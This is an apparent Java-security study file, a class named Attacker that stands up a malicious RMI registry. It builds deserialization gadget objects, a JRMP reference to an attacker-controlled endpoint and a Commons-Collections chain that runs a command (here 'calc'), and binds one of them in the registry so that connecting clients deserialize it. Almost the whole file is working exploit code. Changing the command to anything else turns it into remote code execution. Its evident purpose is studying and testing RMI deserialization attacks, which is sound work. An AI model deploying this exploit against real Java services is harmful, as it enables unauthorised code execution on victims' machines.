package com.pinger.javasec.rmi.attackClient;

import com.pinger.javasec.common.CC2;
import com.pinger.javasec.common.CC3;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;
import java.util.concurrent.CountDownLatch;

/**
 * @author : p1n93r
 * @date : 2021/8/2 10:10
 * 模拟攻击者：恶意的Registry
 */
public class Attacker {

    public static Remote jrmpGadget()throws Exception{
        ObjID id = new ObjID(new Random().nextInt());
        // Attacker's eval RMI registry
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        return obj;
    }

    public static Remote cc2Gadget()throws Exception{
        Object cmd = Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) CC3.getPayload("calc"));
        return Remote.class.cast(cmd);
    }


    public static void main(String[] args) throws Exception{
        String name="EvalClass";
        Registry registry = LocateRegistry.createRegistry(1023);
        registry.bind(name, cc2Gadget());
        new CountDownLatch(1).await();
    }


}
